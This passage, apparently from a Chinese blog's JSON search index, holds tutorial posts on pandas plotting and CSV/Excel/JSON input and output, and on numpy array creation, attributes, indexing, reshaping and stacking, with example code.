-0.340243 0.453327 -0.086441 2020-02-02 -0.659249 0.560961 2.044332 -0.802733 2020-02-03 -1.340092 -0.189921 -0.293884 1.505851 2020-02-04 -1.024036 -0.022197 -1.004789 -0.562610 2020-02-05 0.530465 -0.584053 -0.066200 0.585188 2020-02-06 -0.169236 1.131713 -0.773533 0.206311 2020-02-07 0.583019 0.002341 -0.518091 -1.449647 2020-02-08 1.079004 -1.023189 0.714075 0.353996 \"\"\" 如果行索引中包含日期，Pandas 会自动调用 gct().autofmt_xdate() 来格式化 x 轴。 除了使用默认的线条绘图外，您还可以使用其他绘图方式，如下所示： 柱状图：bar() 或 barh() 直方图：hist() 箱状箱：box() 区域图：area() 散点图：scatter() 通过关键字参数kind可以把上述方法传递给 plot()。 柱状图：bar() 或 barh() import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(10,4),columns=['a','b','c','d']) #或使用df.plot(kind=\"bar\") df.plot.bar() # 通过设置参数stacked=True可以生成柱状堆叠图，示例如下： import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(10,5),columns=['a','b','c','d','e']) df.plot(kind=\"bar\",stacked=True) #或者使用df.plot.bar(stacked=\"True\") # 如果要绘制水平柱状图，您可以使用以下方法： import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(10,4),columns=['a','b','c','d']) print(df) df.plot.barh(stacked=True) 直方图：hist() # 直方图 它还可以指定 bins（构成直方图的箱数）。 import pandas as pd import numpy as np df = pd.DataFrame({'A':np.random.randn(100)+2,'B':np.random.randn(100),'C': np.random.randn(100)-2}, columns=['A', 'B', 'C']) print(df) #指定箱数为15 df.plot.hist(bins=15) # 给每一列数据都绘制一个直方图，需要使以下方法： import pandas as pd import numpy as np df = pd.DataFrame({'A':np.random.randn(100)+2,'B':np.random.randn(100),'C': np.random.randn(100)-2,'D':np.random.randn(100)+3},columns=['A', 'B', 'C','D']) #使用diff绘制 df.diff().hist(color=\"r\",alpha=0.5,bins=15 箱状箱：box() # 箱型图 # 通过调用 Series.box.plot() 、DataFrame.box.plot() 或者 DataFrame.boxplot() 方法来绘制箱型图，它将每一列数据的分布情况，以可视化的图像展现出来。 import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(10, 4), columns=['A', 'B', 'C', 'D']) df.plot.box() 区域图：area() # 区域图 # 您可以使用 Series.plot.area() 或 DataFrame.plot.area() 方法来绘制区域图。 import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(5, 4), columns=['a', 'b', 'c', 'd']) df.plot.area() 散点图：scatter() # 散点图 # 使用 DataFrame.plot.scatter() 方法来绘制散点图，如下所示： import pandas as pd import numpy as np df = pd.DataFrame(np.random.rand(30, 4), columns=['a', 'b', 'c', 'd']) df.plot.scatter(x='a',y='b') 饼图 # 饼状图 # 饼状图可以通过 DataFrame.plot.pie() 方法来绘制。示例如下： import pandas as pd import numpy as np df = pd.DataFrame(3 * np.random.rand(4), index=['go', 'java', 'c++', 'c'], columns=['L']) df.plot.pie(subplots=True) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:5:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"读取csv文件 CSV 又称逗号分隔值文件，是一种简单的文件格式，以特定的结构来排列表格数据。 CSV 文件能够以纯文本形式存储表格数据，比如电子表格、数据库文件，并具有数据交换的通用格式。CSV 文件会在 Excel 文件中被打开，其行和列都定义了标准的数据格式 在 Pandas 中用于读取文本的函数有两个，分别是： read_csv() 和 read_table() ，它们能够自动地将表格数据转换为 DataFrame 对象。 read_csv()格式如下： pandas.read_csv(filepath_or_buffer, sep=',', delimiter=None, header='infer',names=None, index_col=None, usecols=None) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:6:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"read_csv() read_csv() 表示从 CSV 文件中读取数据，并创建 DataFrame 对象。 import pandas #仅仅一行代码就完成了数据读取，但是注意文件路径不要写错 df = pandas.read_csv('C:/Users/Administrator/Desktop/hrd.csv') print(df) 1) 自定义索引 在 CSV 文件中指定了一个列，然后使用index_col可以实现自定义索引。 import pandas as pd df=pd.read_csv(\"C:/Users/Administrator/Desktop/person.csv\",index_col=['ID']) print(df) 2) 查看每一列的dtype import pandas as pd #转换salary为float类型 df=pd.read_csv(\"C:/Users/Administrator/Desktop/person.csv\",dtype={'Salary':np.float64}) print(df.dtypes) 3) 更改文件标头名 使用 names 参数可以指定头文件的名称。 import pandas as pd # 注意：文件标头名是附加的自定义名称，但是您会发现，原来的标头名（列标签名）并没有被删除，此时您可以使用header参数来删除它(假如原标头名并没有定义在第一行，您也可以传递相应的行号来删除它)。 df=pd.read_csv(\"C:/Users/Administrator/Desktop/person.csv\",names=['a','b','c','d','e'],header=0) print(df) 4) 跳过指定的行数 # skiprows参数表示跳过指定的行数。 import pandas as pd df=pd.read_csv(\"C:/Users/Administrator/Desktop/person.csv\",skiprows=2) print(df) # 注意：包含标头所在行。 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:6:1","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"to_csv() 用于将 DataFrame 转换为 CSV 数据。如果想要把 CSV 数据写入文件，只需向函数传递一个文件对象即可。否则，CSV 数据将以字符串格式返回。 import pandas as pd #注意：pd.NaT表示null缺失数据 data = {'Name': ['Smith', 'Parker'], 'ID': [101, pd.NaT], 'Language': ['Python', 'JavaScript']} info = pd.DataFrame(data) csv_data = info.to_csv(\"C:/Users/Administrator/Desktop/pandas.csv\",sep='|') # 指定 CSV 文件输出时的分隔符，并将其保存在 pandas.csv 文件中 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:6:2","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"读写Excel ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:7:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"to_excel() 通过 to_excel() 函数可以将 Dataframe 中的数据写入到 Excel 文件。 如果想要把单个对象写入 Excel 文件，那么必须指定目标文件名；如果想要写入到多张工作表中，则需要创建一个带有目标文件名的ExcelWriter对象，并通过sheet_name参数依次指定工作表的名称。 to_excel()语法格式如下： DataFrame.to_excel(excel_writer, sheet_name='Sheet1', na_rep='', float_format=None, columns=None, header=True, index=True, index_label=None, startrow=0, startcol=0, engine=None, merge_cells=True, encoding=None, inf_rep='inf', verbose=True, freeze_panes=None) \"\"\" 参数项 参数名称 描述说明 excel_wirter 文件路径或者 ExcelWrite 对象。 sheet_name 指定要写入数据的工作表名称。 na_rep 缺失值的表示形式。 float_format 它是一个可选参数，用于格式化浮点数字符串。 columns 指要写入的列。 header 写出每一列的名称，如果给出的是字符串列表，则表示列的别名。 index 表示要写入的索引。 index_label 引用索引列的列标签。如果未指定，并且 hearder 和 index 均为为 True，则使用索引名称。如果 DataFrame 使用 MultiIndex，则需要给出一个序列。 startrow 初始写入的行位置，默认值0。表示引用左上角的行单元格来储存 DataFrame。 startcol 初始写入的列位置，默认值0。表示引用左上角的列单元格来储存 DataFrame。 engine 它是一个可选参数，用于指定要使用的引擎，可以是 openpyxl 或 xlsxwriter。 \"\"\" import pandas as pd #创建DataFrame数据 info_website = pd.DataFrame({'name': ['编程帮', 'c语言中文网', '微学苑', '92python'], 'rank': [1, 2, 3, 4], 'language': ['PHP', 'C', 'PHP','Python' ], 'url': ['www.bianchneg.com', 'c.bianchneg.net', 'www.weixueyuan.com','www.92python.com' ]}) #创建ExcelWrite对象 writer = pd.ExcelWriter('website.xlsx') info_website.to_excel(writer) writer.save() print('输出成功') ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:7:1","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"read_excel() 语法格式： pd.read_excel(io, sheet_name=0, header=0, names=None, index_col=None, usecols=None, squeeze=False,dtype=None, engine=None, converters=None, true_values=None, false_values=None, skiprows=None, nrows=None, na_values=None, parse_dates=False, date_parser=None, thousands=None, comment=None, skipfooter=0, convert_float=True, **kwds) \"\"\" 参数 参数名称 说明 io 表示 Excel 文件的存储路径。 sheet_name 要读取的工作表名称。 header 指定作为列名的行，默认0，即取第一行的值为列名；若数据不包含列名，则设定 header = None。若将其设置 为 header=2，则表示将前两行作为多重索引。 names 一般适用于Excel缺少列名，或者需要重新定义列名的情况；names的长度必须等于Excel表格列的长度，否则会报错。 index_col 用做行索引的列，可以是工作表的列名称，如 index_col = ‘列名’，也可以是整数或者列表。 usecols int或list类型，默认为None，表示需要读取所有列。 squeeze boolean，默认为False，如果解析的数据只包含一列，则返回一个Series。 converters 规定每一列的数据类型。 skiprows 接受一个列表，表示跳过指定行数的数据，从头部第一行开始。 nrows 需要读取的行数。 skipfooter 接受一个列表，省略指定行数的数据，从尾部最后一行开始。 \"\"\" import pandas as pd #读取excel数据 df = pd.read_excel('website.xlsx',index_col='name',skiprows=[2]) #处理未命名列 df.columns = df.columns.str.replace('Unnamed.*', 'col_label') print(df) import pandas as pd #读取excel数据 #index_col选择前两列作为索引列 #选择前三列数据，name列作为行索引 df = pd.read_excel('website.xlsx',index_col='name',index_col=[0,1],usecols=[1,2,3]) #处理未命名列，固定用法 df.columns = df.columns.str.replace('Unnamed.*', 'col_label') print(df) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:7:2","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"与Numpy ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:8:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"布尔索引 布尔索引是 NumPy 的重要特性之一，通常与 Pandas 一起使用。它的主要作用是过滤 DataFrame 中的数据，比如布尔值的掩码操作。 下面示例展示了如何使用布尔索引访问 DataFrame 中的数据。 首先创建一组包含布尔索引的数据，如下所示： import pandas as pd dict = {'name':[\"Smith\", \"William\", \"Phill\", \"Parker\"], 'age': [\"28\", \"39\", \"34\", \"36\"]} info = pd.DataFrame(dict, index = [True, True, False, True]) print(info) 然后使用.loc访问索引为 True 的数据。示例如下： import pandas as pd dict = {'name':[\"Smith\", \"William\", \"Phill\", \"Parker\"], 'age': [\"28\", \"39\", \"34\", \"36\"]} info = pd.DataFrame(dict, index = [True, True, False, True]) #返回所有为 True的数据 print(info.loc[True]) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:8:1","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"转换ndarray数组 在某些情况下，需要执行一些 NumPy 数值计算的高级函数，这个时候您可以使用 to_numpy() 函数，将 DataFrame 对象转换为 NumPy ndarray 数组，并将其返回。函数的语法格式如下： info = pd.DataFrame({\"P\": [2, 3], \"Q\": [4.0, 5.8]}) #给info添加R列 info['R'] = pd.date_range('2020-12-23', periods=2) print(info) #将其转化为numpy数组 n=info.to_numpy() print(n) print(type(n)) import pandas as pd #创建DataFrame对象 info = pd.DataFrame([[17, 62, 35],[25, 36, 54],[42, 20, 15],[48, 62, 76]], columns=['x', 'y', 'z']) print('DataFrame\\n----------\\n', info) #转换DataFrame为数组array arr = info.to_numpy() print('\\nNumpy Array\\n----------\\n', arr) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:8:2","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"读取json文件 import pandas as pd data = pd.read_json('C:/Users/Administrator/Desktop/hrd.json') print(data) ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:9:0","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"区别 ","date":"2022-04-29","objectID":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/:9:1","tags":["pandas","数据分析","机器学习"],"title":"Python之Pandas入门","uri":"/python%E4%B9%8Bpandas%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"介绍 NumPy是一个功能强大的Python库，主要用于对多维数组执行计算。 NumPy这个词来源于两个单词：Numerical和Python。 NumPy提供了大量的库函数和操作，可以帮助程序员轻松地进行数值计算。在数据分析和机器学习领域被广泛使用 特点： numpy内置了并行运算功能，当系统有多个核心时，做某种计算时，numpy会自动做并行计算。 Numpy底层使用C语言编写，内部解除了GIL（全局解释器锁），其对数组的操作速度不受Python解释器的限制，效率远高于纯Python代码。 有一个强大的N维数组对象Array（一种类似于列表的东西，它是一系列 “同类型数据” 的集合）。 实用的线性代数、傅里叶变换和随机数生成函数。 总之，是一个非常高效的用于处理数值型运算的包。 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:1:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Numpy数组对象 Numpy中的多维数组称为ndarray，这是Numpy中最常见的数组对象。 ndarray对象通常包含两个部分： ndarray数据本身 描述数据的元数据 Numpy数组的优势: Numpy数组通常是由相同种类的元素组成的，即数组中的数据项的类型一致。这样有一个好处，由于知道数组元素的类型相同，所以能快速确定存储数据所需空间的大小。 Numpy数组能够运用向量化运算来处理整个数组，速度较快；而Python的列表则通常需要借助循环语句遍历列表，运行效率相对来说要差。 Numpy使用了优化过的C API，运算速度较快 Numpy数组和Python列表性能对比： 比如我们想要对一个Numpy数组和Python列表中的每个素进行求平方。代码如下： import numpy as np import time t1 = time.time() a = [] for x in range(100000): a.append(x**2) t2 = time.time() t = t2 - t1 print(t) # 0.0342259407043457 t3 = time.time() b = np.arange(100000)**2 t4 = time.time() print(t4-t3) # 结果为：0.0002129077911376953 可见速度快了很多 看完上面numpy处理速度如此之快的例子，是不是更有动力学下去了呢！ ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:2:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"创建ndarray数组 导入numpy库，在导入numpy库时通常使用“np”作为简写，这也是Numpy官方倡导的写法 import numpy as np 常用的创建数组的方式： ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方式1：基于list或tuple import numpy as np # 1.一维数组 # 基于list arr1 = np.array([1, 2, 3, 4]) # arr1 = np.array([1, 2, 3, 4], dtype=int) 创建数组的时候可以指定数组元素的数据类型 print(arr1) # 基于tuple arr2 = np.array((1, 2, 3, 4)) print(arr2) # 2.二维数组 arr3 = np.array([[1, 2, 3, 4], [5,6,7,8]]) # 每个小列表外面还有一个大的[]符号 print(arr3) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:1","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方式2： 基于np.arrange # 一维数组 arr1 = np.arange(5) print(arr1) # [0 1 2 3 4] # 二维数组 arr2 = np.array([np.arange(3), np.arange(3)]) print(arr2) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:2","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方式3：基于arange以及reshape创建多维数组 # 创建三维数组 arr3 = np.arange(24).reshape(2, 3, 4) # arange的长度与ndarray的维度的乘积要相等，即 24 = 2X3X4 print(arr3) # 创建二维数组 arr2 = np.arange(30).reshape(5, 6) print(arr2) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:3","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法4：empty方法创建数组 该方式可以创建一个空数组，dtype可以指定随机数的类型，否则随机采用一种类型生成随机数。 import numpy as np dt = np.numpy([2, 2], dtype=int) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:4","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法5：使用zeros/ones创建数组 调用zeros/ones方法会创建一个全为0/1值的数组，通常在数组元素位置，大小一致的情况下来生成临时数组。0/1充当占位符。 import numpy as np dt = np.zeros([3, 5], dtype=int) print('数组：', dt) print('数据类型：', dt.dtype) dt = np.ones([5, 3], dtype=float) print('数组：', dt) print('数据类型：', dt.dtype) \"\"\" 数组： [[0 0 0 0 0] [0 0 0 0 0] [0 0 0 0 0]] 数据类型： int64 数组： [[1. 1. 1.] [1. 1. 1.] [1. 1. 1.] [1. 1. 1.] [1. 1. 1.]] 数据类型： float64 \"\"\" ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:5","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法6：numpy.random创建数组 1.使用numpy.random.rand创建数组 很多情况下手动创建的数组往往不能满足业务需求，因此需要创建随机数组。 用于生成[0.0, 1.0)之间的随机浮点数， 当没有参数时，返回一个随机浮点数，当有一个参数时，返回该参数长度大小的一维随机浮点数数组，参数建议是整数型，因为未来版本的numpy可能不支持非整形参数。 import numpy as np dt = np.random.rand(10) print('数组：', dt) print('数据类型：', dt.dtype) 2.使用numpy.random.randn创建数组 它能产生符合正态分布的随机数 import numpy as np dt = np.random.randn(3, 5) print('数组：', dt) print('数据类型：', dt.dtype) \"\"\" 数组： [[ 0.67710547 1.97369481 -0.35002974 -1.0614128 -0.19732801] [-1.13230353 -0.53488291 -1.17557386 -0.67431941 -0.78063236] [-0.97807192 0.48440274 1.00098854 -1.9964855 0.89089835]] 数据类型： float64 \"\"\" 3.使用numpy.random.randint创建数组 # 在10和30之间(左闭右开)产生随机数，并从中取5个数值来构建数组。 import numpy as np dt = np.random.randint(10, 30, 5) print('数组：', dt) print('数据类型：', dt.dtype) # np.random.random_integers(5) 是闭区间 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:6","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法7：使用linspace创建数组 linspace是基于一个范围来构造数组，参数num是开始值和结束值之间需要创建多少个数值。 retstep会改变计算的输出，返回一个元组，而元组的两个元素分别是需要生成的数组和数组的步差值。 import numpy as np dt = np.linspace(20, 30, num=5) print('数组：', dt) print('数据类型：', dt.dtype) dt = np.linspace(20, 30, num=5, endpoint=False) print('数组：', dt) print('数据类型：', dt.dtype) dt = np.linspace(20, 30, num=5, retstep=True) print('元组：', dt) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:7","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法8：logspace创建数组 和linspace函数类似，不过创建的是等比数列数组 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:8","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"方法9：fromfunction创建数组 fromfunction方法可以通过一个函数规则来创建数组。该方法中shape参数制定了创建数组的规则，shape=(4,5)，最终创建的结果就是4行5列的二维数组。 import numpy as np dt = np.fromfunction(lambda i, j:i + j, (4, 5), dtype=int) print('数组：', dt) print('数据类型：', dt.dtype) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:3:9","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Numpy的数值类型 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:4:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Numpy数值类型如下： 每一种数据类型都有相应的数据转换函数，如下： print(np.int8(12.332)) print(np.float64(12)) \"\"\" 12 12.0 \"\"\" ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:4:1","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"数组的类型转换 数组转换成list，使用tolist(): a.tolist() 转换成指定类型，astype()函数: a.astype(float) ① 创建numpy数组的时候可以通过属性dtype显式指定数据的类型。 ② 在不指定数据类型的情况下，numpy会自动推断出适合的数据类型。 ③ 如果需要更改一个已经存在的数组的数据类型，可以通过astype方法进行修改从而得到一个新数组。 a2 = np.array([1,2,3,4]) # 自动推断出合适的数据类型，里面无浮点数，变为int32 print(a2.dtype) a3 = a2.astype(float) # astype得到的是一个新数组，原数组没有改变。 print(a2.dtype) print(a2) print(a3.dtype) print(a3) \"\"\" 运行结果： int32 int32 [1 2 3 4] float64 [1. 2. 3. 4.] \"\"\" 复数不能转换成为整数类型或者浮点数。 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:4:2","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"Numpy数组的属性 查看数组的属性: import numpy as np a = np.array([[1,2,3],[4,5,6]]) print(a) print(a.ndim) # ndarry维度 ndarry维度跟最外层括号[]有关 print(a.shape) # ndarry形状 print(a.size) # ndarry元素个数 print(a.dtype) # ndarry元素类型 dtype属性，ndarray数组的数据类型，数据类型的种类。 print(np.arange(4, dtype=float)) print(np.arange(4, dtype='D')) # # 'D'表示复数类型 print(np.array([1.22,3.45,6.779], dtype='int8')) ndim属性，数组维度的数量 a = np.array([[1,2,3], [7,8,9]]) print(a.ndim) # 2 shape属性，数组对象的尺度，对于矩阵，即n行m列,shape是一个元组（tuple） a = np.array([[1,2,3],[4,5,6]]) print(a.shape) size属性用来保存元素的数量，相当于shape中nXm的值 print(a.size) itemsize属性返回数组中各个元素所占用的字节数大小。 a.itemsize nbytes属性，如果想知道整个数组所需的字节数量，可以使用nbytes属性。其值等于数组的size属性值乘以itemsize属性值。 print(a.nbytes) print(a.size*a.itemsize) T属性，数组转置 b = np.arange(24).reshape(4,6) print(b.T) 复数的实部和虚部属性，real和imag属性 d = np.array([1.2+2j, 2+3j]) # real属性返回数组的实部 d.real # imag属性返回数组的虚部 d.imag flat属性，返回一个numpy.flatiter对象，即可迭代的对象。 for item in arr.flat: print(item) print(arr.flat[0]) # 索引 arr.flat[1] = 555 # 也可以进行赋值 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:5:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"ndarray数组的切片和索引 一维数组的切片与索引：和python的list类似 arr[1:4] arr[:6:2] 二维数组的切片与索引：和python的list类似 arr = np.arrange(12).reshape(3,4) a[0:3, 0:2] # 两个坐标轴上分别切片 a = np.array([[1,2,3],[4,5,6],[7,8,9]]) print(a[...,1]) # 取第二列 print(a[1,...]) # 取第二行 print(a[2]) # 取第三行 # ...表示不进行任何操作，和冒号:一样的意思 x = np.array([[1,2],[3,4],[5,6]]) print(x) # 数组，数组 → 取行和列中对应元素，维度为1维 y = x[[0,1,2],[0,1,0]] # [0,1,2] 取的每行的所有，即第0行、第1行、第2行 此方法相对切片可以得到任意位置 print(y) x = np.array([[1,2],[3,4],[5,6]]) print(x) # 切片，数组 → 取行对应元素，维度不变 y = x[1:3,[0,1]] # 取第0列、第1列元素 z = x[1:3,[0,1,0]] # 取第0列、第1列、第0列元素 print(y) print(z) x = np.array([[1,2],[3,4],[5,6]]) y = x[[True,True,False]] # 取第0行、第1行，第3行不取 print(y) x = np.arange(32).reshape((8,4)) print(x) x[[-4,-2,-1,-7]] # 取-4列、-2列、-1列、-7列的数组 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:6:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"处理数组形状 ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:7:0","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"形状转换 1.reshape()和resize() 直接使用reshape函数创建一个改变尺寸的新数组，原数组的shape保持不变，但是新数组和原数组共享一个内存空间，也就是修改任何一个数组中的值都会对另外一个产生影响，另外要求新数组的元素个数和原数组一致。 b.reshape(4,3) 函数resize()的作用跟reshape（）类似，但是会改变所作用的数组，相当于有inplace=True的效果 b.resize(4,3) **2.ravel()和flatten():**将多维数组转换成一维数组，如下： b.ravel() b.flatten() \"\"\" 两者的区别在于返回拷贝（copy）还是返回视图（view），flatten()返回一份拷贝，需要分配新的内存空间，对拷贝所做的修改不会影响原始矩阵，而ravel()返回的是视图（view），会影响原始矩阵。 \"\"\" 3.用tuple指定数组的形状 b.shape=(2,6) 4.转置 前面描述了数组转置的属性（T），也可以通过transpose()函数来实现。 转置时重塑的一种特殊形式，它返回的是源数据的视图(不会进行任何赋值操作)。 import numpy as np arr = np.arange(15).reshape((3,5)) print(arr) # 方法一： print(arr.T) # 用数组的T方法进行转置 print(arr.T) # 默认将第一个维度和第二个维度进行转换 print(arr.T.shape) # 第一个维度到最后一个维度，第二个维度到倒数第二个维 # 方法二： print(np.transpose(arr)) # 用transpose方法一进行转置 # 方法三： print(arr.transpose(1,0)) # 用transpose方法二进行转置 print(arr) # 源数据没有变化 import numpy as np arr = np.arange(120).reshape((2,3,4,5)) arr.transpose(0,3,2,1).shape # 原本是arr.transpose(0,1,2,3) 因此指定第二个轴和第四个轴进行交换 ########################## import numpy as np arr = np.arange(120).reshape((2,3,4,5)) arr.swapaxes(1,3).shape # 跟 arr.transpose(0,3,2,1).shape 等价，swapaxes方法直接填写第一轴和第三轴即可 # 元素0可表示为arr[0][0][0]，元素6可表示为 arr[0][1][2] # 去掉一层括号，看它在哪个位置 arr = np.arange(24).reshape((2,3,4)) print(arr) print(arr.transpose((1,0,2))) # 表示将轴1和0位置互换，轴2不变，即代表将轴0和1对换，轴2不变，亦即将arr[x][y][z]中x和y位置互换，整个数组将变换 print(arr.swapaxes(1,2)) # 表示将轴1和轴2位置互换，轴0不变 # 矩阵线性代数相乘 arr = np.arange(6).reshape((2,3)) np.dot(arr.T,arr) ","date":"2022-04-28","objectID":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/:7:1","tags":["Python","Numpy"],"title":"Python之Numpy学习","uri":"/python%E4%B9%8Bnumpy%E5%AD%A6%E4%B9%A0/"},{"categories":["Python"],"content":"堆叠数组 c = a*2 # 每个元素都*2 水平叠加 hstack() np.hstack((b,c)) # column_stack()函数以列方式对数组进行叠加，功能类似hstack（） np.column_stack((b,c)) 垂直叠加 vstack() np.vstack((b,c)) # row_stack()函数以行方式对数组进行叠加，功能类似vstack（） np.row_stack((b,c)) concatenate()方法，通过设置axis的值来设置叠加方向 axis=1时，沿水平方向叠加 axis=0时，沿垂直方向叠加 np.concatenate((b,c),axis=1) np.concatenate((b,c),axis=0) 对数组的轴为0或1的方向经常会混淆，参考如下图： 